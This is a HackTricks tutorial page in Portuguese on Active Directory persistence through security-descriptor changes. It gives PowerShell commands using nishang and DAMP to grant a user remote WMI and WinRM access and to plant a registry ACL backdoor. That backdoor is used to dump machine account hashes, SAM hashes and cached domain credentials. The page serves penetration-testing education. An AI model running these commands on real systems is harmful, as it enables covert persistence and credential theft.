# Descritores de segurança

{{#include ../../banners/hacktricks-training.md}}

## Descritores de segurança

[Da documentação](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language): Security Descriptor Definition Language (SDDL) define o formato usado para descrever um descritor de segurança. SDDL usa strings ACE para DACL e SACL: `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`<sup>[[1]](#references)</sup>

Os **descritores de segurança** são usados para **armazenar** as **permissões** que um **objeto** possui **sobre** um **objeto**. Se você conseguir **fazer** apenas uma **pequena alteração** no **descritor de segurança** de um objeto, poderá obter privilégios muito interessantes sobre esse objeto sem precisar ser membro de um grupo privilegiado.

Assim, esta técnica de persistence baseia-se na capacidade de obter todos os privilégios necessários sobre determinados objetos, permitindo executar uma tarefa que normalmente exige privilégios de administrador, mas sem a necessidade de ser administrador.

### Acesso ao WMI

Você pode conceder a um usuário acesso para **executar WMI remotamente** [**usando isto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc –namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc–namespace 'root\cimv2' -Remove -Verbose #Remove
```
### Acesso ao WinRM

Dê acesso ao **winrm PS console a um usuário** [**usando isto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)**:**<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acesso remoto a hashes

Acesse o **registry** e faça **dump de hashes** criando um **Reg backdoor usando** [**DAMP**](https://github.com/HarmJ0y/DAMP)**,** para que você possa, a qualquer momento, obter o **hash do computador**, o **SAM** e qualquer credencial **AD** em cache no computador. Portanto, é muito útil conceder essa permissão a um **usuário comum em um computador Domain Controller**:<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Confira [**Silver Tickets**](silver-ticket.md) para aprender como usar o hash da conta de computador de um Controlador de Domínio.

## Referências

- [1] [Security Descriptor Definition Language - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Discretionary ACL Modification Project](https://github.com/HarmJ0y/DAMP)

{{#include ../../banners/hacktricks-training.md}}
